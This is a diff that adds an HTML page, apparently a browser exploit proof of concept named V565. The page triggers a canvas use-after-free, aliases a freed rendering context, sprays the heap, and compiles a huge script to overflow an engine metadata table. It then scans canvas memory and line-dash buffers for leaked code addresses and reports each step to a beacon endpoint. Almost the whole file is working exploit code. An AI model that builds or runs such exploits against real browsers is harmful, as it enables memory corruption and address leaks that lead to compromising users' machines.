@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V565</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V565-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+// === Heap warmup: drain stale 768B freelist entries ===
+function heapWarmup768(){
+  var warmup=[];
+  for(var i=0;i<100;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    warmup.push(c.getContext('2d'));
+  }
+  warmup=null;
+  var fresh=[];
+  for(var i=0;i<50;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    fresh.push(c.getContext('2d'));
+  }
+  return fresh;
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx,canvas:outer};
+}
+
+function massReclaim(w,h){
+  if(!w)w=10;if(!h)h=10;
+  var contexts=[];var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=200+i;
+    contexts.push(ctx);canvases.push(c);
+  }
+  return {contexts:contexts,canvases:canvases};
+}
+
+function lightGC(){
+  for(var g=0;g<5;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+// =============================================
+// PHASE 0: Boot + heap warmup + alias setup
+// =============================================
+beacon('BOOT','V565-metadata-infoleak');
+
+var warmupCtxs=heapWarmup768();
+beacon('WARMUP','kept='+warmupCtxs.length);
+
+var u=triggerUAF();
+var r=massReclaim(10,10);
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+beacon('SETUP','aliasIdx='+idx+'|lw='+lw);
+
+if(idx<0||idx>=200||lw<200||lw>=400){
+  beacon('FAIL','alias-failed|idx='+idx+'|lw='+lw);
+  setTimeout(function(){location.reload()},3000);
+  throw new Error('STOP');
+}
+
+u.ctx=null;u=null;
+lightGC();
+
+var aliasCtx=r.contexts[idx];
+var aliasCvs=r.canvases[idx];
+beacon('GC','survived|lw='+aliasCtx.lineWidth);
+
+// =============================================
+// T1: Canvas backing store zero-check
+// Create 1x25028 canvas (backing = 100112B), don't draw, scan for stale data
+// =============================================
+(function(){
+  try{
+    var tc=document.createElement('canvas');
+    tc.width=1;tc.height=25028;
+    var tctx=tc.getContext('2d');
+    var px=tctx.getImageData(0,0,1,25028);
+    var nz=0,first=-1;
+    for(var i=0;i<px.data.length;i++){
+      if(px.data[i]!==0){nz++;if(first<0)first=i;}
+    }
+    beacon('T1','backing-zero|bytes='+px.data.length+'|nz='+nz+'|first='+first);
+    tc=null;tctx=null;px=null;
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: Bait-and-switch spray
+// Baits at LOWER addresses, targets at HIGHER addresses
+// Free baits → MetadataTable fills hole → sweep FORWARD into targets
+// =============================================
+var baits=[];
+var targets=[];
+var targetCtxs=[];
+
+// BAITS: 60x ArrayBuffer(100112) — same size class as MetadataTable buffer
+for(var i=0;i<60;i++) baits.push(new ArrayBuffer(100112));
+beacon('T2A','baits='+baits.length);
+
+// TARGETS: 30x canvas(1,25028) — backing store = 1*25028*4 = 100112 bytes
+for(var i=0;i<30;i++){
+  var tc=document.createElement('canvas');
+  tc.width=1;tc.height=25028;
+  var tctx=tc.getContext('2d');
+  tctx.getImageData(0,0,1,1); // force backing store allocation
+  targets.push(tc);
+  targetCtxs.push(tctx);
+}
+beacon('T2B','targets='+targets.length);
+
+// Set lineDash through alias (allocates Vector<double> buffer in FastMalloc)
+var dashArr=[];
+for(var i=0;i<900;i++) dashArr.push(1+i*0.001);
+aliasCtx.setLineDash(dashArr);
+beacon('T2C','lineDash='+aliasCtx.getLineDash().length);
+
+// Free baits — creates holes for MetadataTable to land in
+for(var i=0;i<baits.length;i++) baits[i]=null;
+baits=null;
+lightGC();
+beacon('T2D','baits-freed');
+
+// =============================================
+// T3: MetadataTable overflow compilation
+// 38,348,816 op_call → overflow → 4.3GB forward sweep
+// if(0) prevents execution-time crash
+// Thunk address written at entry+24 of each 112-byte stride
+// =============================================
+(function(){
+  try{
+    var N=38348816;
+    var t0=Date.now();
+    beacon('T3A','building|N='+N);
+
+    // Build source efficiently: reuse one 40KB chunk string
+    var CPCH=10000;
+    var chunk='f();'.repeat(CPCH); // 40KB, reused by reference
+    var parts=['(function(){function f(){}if(0){'];
+    var full=Math.floor(N/CPCH);
+    for(var i=0;i<full;i++) parts.push(chunk);
+    var rem=N%CPCH;
+    if(rem>0) parts.push('f();'.repeat(rem));
+    parts.push('}})();');
+
+    beacon('T3B','source-ready|parts='+parts.length+'|ms='+(Date.now()-t0));
+
+    var blob=new Blob(parts,{type:'application/javascript'});
+    parts=null;chunk=null;
+
+    var url=URL.createObjectURL(blob);
+    var script=document.createElement('script');
+    script.src=url;
+
+    script.onload=function(){
+      URL.revokeObjectURL(url);
+      blob=null;
+      beacon('T3C','COMPILED-OK|ms='+(Date.now()-t0));
+      runScan();
+    };
+    script.onerror=function(){
+      beacon('T3C','COMPILE-ERR|ms='+(Date.now()-t0));
+      runScan();
+    };
+    document.head.appendChild(script);
+  }catch(e){
+    beacon('T3','ERR:'+e.message);
+    runScan();
+  }
+})();
+
+// =============================================
+// T4-T6: Scan for thunk addresses after sweep
+// =============================================
+function runScan(){
+
+  // T4: Scan target canvas backing stores at thunk offset (+24 per 112B stride)
+  var totalHits=0;
+  var thunkMap={};
+
+  for(var t=0;t<targets.length;t++){
+    try{
+      var px=targetCtxs[t].getImageData(0,0,1,25028);
+      var d=px.data;
+      var hits=0,ffHits=0;
+      var samples=[];
+
+      // Each 112-byte stride: thunk at +24 (8 bytes), m_slowPathCount at +12 (4 bytes 0xFFFFFFFF)
+      var maxStride=Math.floor(d.length/112);
+      for(var s=0;s<maxStride;s++){
+        var base=s*112;
+
+        // Check m_slowPathCount at +12 for 0xFFFFFFFF
+        if(d[base+12]===0xff&&d[base+13]===0xff&&d[base+14]===0xff&&d[base+15]===0xff) ffHits++;
+
+        // Read 8-byte thunk at +24 (little-endian)
+        var off=base+24;
+        if(off+7>=d.length) break;
+        var hex='';
+        var nz=false;
+        for(var j=7;j>=0;j--){
+          var bv=d[off+j];
+          if(bv) nz=true;
+          hex+=('0'+bv.toString(16)).slice(-2);
+        }
+        if(nz){
+          hits++;
+          if(!thunkMap[hex]) thunkMap[hex]=0;
+          thunkMap[hex]++;
+          if(samples.length<3) samples.push(hex);
+        }
+      }
+
+      totalHits+=hits;
+      if(hits>0||ffHits>0||t<3){
+        beacon('T4-'+t,'thunk='+hits+'|ff='+ffHits+'|s='+samples.join(','));
+      }
+    }catch(e){beacon('T4-'+t,'ERR:'+e.message)}
+  }
+
+  // Find most frequent thunk candidate
+  var bestThunk='',bestCount=0;
+  for(var k in thunkMap){
+    if(thunkMap[k]>bestCount){bestCount=thunkMap[k];bestThunk=k;}
+  }
+  beacon('T4','TOTAL|hits='+totalHits+'|best='+bestThunk+'|bestN='+bestCount+'|targets='+targets.length);
+
+  // T5: Scan lineDash through alias for pointer-like values
+  try{
+    var ld=aliasCtx.getLineDash();
+    var ptrHits=0;
+    var dashSamples=[];
+    for(var i=0;i<ld.length;i++){
+      if(ld[i]>1000000||ld[i]<-1000000||ld[i]!==ld[i]){
+        ptrHits++;
+        if(dashSamples.length<5){
+          var dv=new DataView(new ArrayBuffer(8));
+          dv.setFloat64(0,ld[i]);
+          var hex='';
+          for(var j=0;j<8;j++) hex+=('0'+dv.getUint8(j).toString(16)).slice(-2);
+          dashSamples.push('i'+i+'='+hex);
+        }
+      }
+    }
+    beacon('T5','lineDash|len='+ld.length+'|ptrHits='+ptrHits+'|s='+dashSamples.join(','));
+  }catch(e){beacon('T5','ERR:'+e.message)}
+
+  // T6: Full non-zero byte count on first 3 targets
+  for(var t=0;t<Math.min(3,targets.length);t++){
+    try{
+      var px=targetCtxs[t].getImageData(0,0,1,25028);
+      var nz=0,first=-1;
+      for(var i=0;i<px.data.length;i++){
+        if(px.data[i]!==0){nz++;if(first<0)first=i;}
+      }
+      beacon('T6-'+t,'fullscan|nz='+nz+'|first='+first);
+    }catch(e){beacon('T6-'+t,'ERR:'+e.message)}
+  }
+
+  // T7: Alias health check — lineWidth still works?
+  try{
+    aliasCtx.lineWidth=77.77;
+    var readback=aliasCtx.lineWidth;
+    beacon('T7','alias-health|set=77.77|got='+readback+'|ok='+(readback===77.77));
+  }catch(e){beacon('T7','ERR:'+e.message)}
+
+  beacon('DONE','V565-complete');
+}
+</script>
+</body></html>
